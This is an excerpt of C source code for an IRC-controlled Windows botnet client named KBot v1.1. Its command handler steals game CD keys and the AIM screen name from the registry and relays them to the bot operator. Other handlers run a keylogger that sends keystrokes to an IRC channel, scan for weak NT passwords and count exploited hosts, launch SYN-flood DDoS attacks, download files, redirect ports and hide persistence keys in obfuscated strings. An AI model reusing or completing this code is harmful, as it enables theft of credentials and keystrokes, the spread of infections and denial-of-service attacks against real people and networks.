...
char nick[100];
char realname[250];
char runoncekey[] = "tpguxbsf}näÑìêîêáï}xäèÖêòî}d-ììÜèïwÜìîäêè}s-èpèÑÜ";
char runkey[] = "tpguxbsf}näÑìêîêáï}xäèÖêòî}d-ììÜèïwÜìîäêè}s-è";
...
const char OK[] = "3OPERATION COMPLETE";
char IP[] = "000.000.000.000";
const char No_File[] = "4No File";
...
int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto)
{
	...
	if (strcmp(raw_command, command) == 0)  {
      ...
      sprintf(x, "[Uptime] %dd %dh %dm.", total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
}

	else if (strcmp(longuptime_command, command) == 0) { 
            int total; 
            total = GetTickCount() / 1000; 
            if (total/86400 >= 4) 
    sprintf(x, "[Long Uptime] %dd %dh %dm.", total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
		...
		sprintf(x, "Bot Version: %s, coded by Kasket KBot v1.1", Bot_Version);
	}
/*end*/
...
HKEY hkey=NULL; DWORD dwSize=128; unsigned char szDataBuf[128];
		...
		*/
		...
		if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Counter Strike) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
...
sprintf(x, "[CDKEYS] (The Gladiators) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
...
sprintf(x, "[CDKEYS] (NHL 2003) %s\r\n", szDataBuf);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Nascar Racing 2002) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Nascar Racing 2004) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
...
sprintf(x, "[CDKEYS] (BF1942) %s\r\n", szDataBuf);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (BF1942 Road To Rome) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (BF1942 SWoWWII) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Command And Conquer Generals) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Project IGI 2) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
/*
				Red Alert
		*/
...
sprintf(x, "[CDKEYS] (Red Alert) %s\r\n", szDataBuf);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Red Alert 2) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Tiberian Sun) %s\r\n", szDataBuf);
		RegCloseKey(hkey);
...
sprintf(x, "[CDKEYS] (Chrome) %s\r\n", szDataBuf);
		...
		*/
		...
		if(RegQueryValueEx(hkey, "key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
sprintf(x, "[CDKEYS] (Hidden and Dangerous 2) %s\r\n", szDataBuf);
		RegCloseKey(hkey);

	}
        else if (strcmp(ntscan_command, command)==0) {
	     if (scanning == TRUE) {
	       sprintf(x ,"[NTSCAN] Scan Already Running");
	     }	
	     else {
		 ...
		 if (parmenters['b']==0) {
	       ...
	       sprintf(x,"[NTSCAN] Scanning NT Pass: %s (T:%d, M:%d)",ns->ipmask,ns->threads,ns->minutes);
	       ...
	       sprintf(buf,"[NTSCAN] Scanning Subnet %s.",s[3]);
		 ...
		 if (TerminateThread(threads[i].Threat_Handle,0) != 0) {
		   threads[i].id = 0; 
		   sprintf(x,"[NTSCAN] Stoped Scanning");
		 }
		 else
		   sprintf(x,"[NTSCAN] Failed To Stop");
	       }
	     }
	     //sprintf(x,"[NTSCAN] No Scan Is Running");
	}
	     ...
	     sprintf(x, "[NTSCAN] (Stats) Exploited %d Hosts.", sploitstats);
	}
	else if (strcmp(winkeys_command, command) == 0) {
	    HKEY hkey = NULL;
    ...
    RegCloseKey(hkey);
	    ...
	    if(RegQueryValueEx(hkey, "Screen Name", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
                    sprintf(x, "[Aim ScreenName] %s\r\n", szDataBuf);
		}
    RegCloseKey(hkey);
	}
/* end */
	else if (strcmp(startkeylogger_command, command) == 0)  {
		if (sendkeysto == 1) sprintf(x,"[Keylogger] Key Logger Already Running on %s",keylogchan);
		else {
			if (sendto != NULL) {
				sprintf(keylogchan,sendto);
				sprintf(x,"[Keylogger] Send: %s",keylogchan);
			}
			else {
				memset(keylogchan,0,sizeof(keylogchan));
				memset(clone_data,0,sizeof(clone_data));
				sprintf(x,"[Keylogger] Send: DCC chat");
			}
			sendkeysto = 1;
			keysock = sendsock;
			BOOL keylog = FALSE;
			...
			if (keylog == FALSE) {
				...
				sprintf(buf,"[Keylogger] Log to %s",keylogchan);
		...
		else if (strcmp(flushdns_command, command) == 0) {
		ShellExecute(0, NULL, "ipconfig.exe", "/flushdns", NULL, SW_SHOWNORMAL);
		}
			...
			if (threads[t].id != 0) {
				if (TerminateThread(threads[t].Threat_Handle,0) == 0) strcpy(x,Error);
					...
					sprintf(x,"[Threads]killed (%s)",threads[t].name);
			...
			sprintf(x,"[Downloading...] %s %s",s[1],s[2]);
				...
				if (sendto != NULL) strcpy(sendtochan,sendto); 
 		 		if (strcmp("SEND",command) == 0) { //dcc send
					...
					if ((sock = Listen(atoi(s[1]))) == -1) strcpy(x,Error);
						...
						sprintf(x,"[Redirect] Redirecting from %s:%i to %s:%i",IP,atoi(s[1]),s[2],atoi(s[3]));
					...
					if (Threat_Handle) {	
						if (strlen(scan[i].file) > 2) sprintf(x,"KBOTscan: %s port %i delay %ssec. log: %s",scan[i].ip,scan[i].port,s[3],scan[i].file);
						else sprintf(x,"KBOTscan: %s p: %i delay %ssec.",scan[i].ip,scan[i].port,s[3]);
					...
					memset(x,0,sizeof(x));
					sprintf(x,"[DDOS] Syn Flooding %s on port %i delay %i t:%i.",syn[i].host,syn[i].port,syn[i].delay,syn[i].times);
...
DWORD WINAPI identserv(LPVOID Param)
{
	...
	while (run_ident) {
		if ((sock = accept(identsock, (SOCKADDR *)&identaddr,&addrlen)) != INVALID_SOCKET)  {
			Sleep(1000);
			sprintf(sendbuf, "%d, %d : USERID : kbot : %s\r\n", rand()%6000+1, port, (char *)nick); 
...
int getfiles(char *current,SOCKET dccsock,char *chan,char *URL)
{
	...
	int count2 = 0;
	strtok(current,"\n");
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Searcing for: %s\r\n",chan,current);
	else if (URL) sprintf(sendbuf,"<HTML><PRE>\n");
	else sprintf(sendbuf,"Searcing for: %s\r\n",current);
